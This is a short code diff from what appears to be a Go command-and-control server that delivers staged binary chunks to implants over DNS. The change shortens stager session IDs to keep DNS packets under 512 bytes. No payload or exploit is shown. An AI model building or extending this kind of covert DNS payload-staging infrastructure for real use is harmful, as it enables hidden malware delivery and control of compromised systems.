@@ -1319,7 +1319,8 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 				var chunkCount int
 				if err := rows.Scan(&clientBinaryID, &chunkCount); err == nil && chunkCount > 0 {
 					// We have cached chunks! Generate session locally and respond immediately
-					sessionID := fmt.Sprintf("stg_%d_%d", time.Now().UnixNano(), rand.Intn(10000))
+					// Use 4-char random ID to keep DNS packet size under 512 bytes
+					sessionID := fmt.Sprintf("stg_%04x", rand.Intn(65536))
 
 					if !isDuplicate {
 						logf("[C2] 🚀 Cache HIT for stager! Using cached binary: %s (%d chunks)", clientBinaryID, chunkCount)
@@ -1463,8 +1464,8 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 			stagerIP, stagerOS, stagerArch, len(chunks), chunkSize)
 	}
 
-	// Generate session ID for standalone mode
-	sessionID := fmt.Sprintf("stg_%d_%d", time.Now().Unix(), rand.Intn(10000))
+	// Generate session ID for standalone mode (4-char random ID to keep DNS packets small)
+	sessionID := fmt.Sprintf("stg_%04x", rand.Intn(65536))
 
 	// Store session for this stager using the stager's actual IP (not DNS resolver IP)
 	// This allows the stager to send ACKs through different DNS resolvers
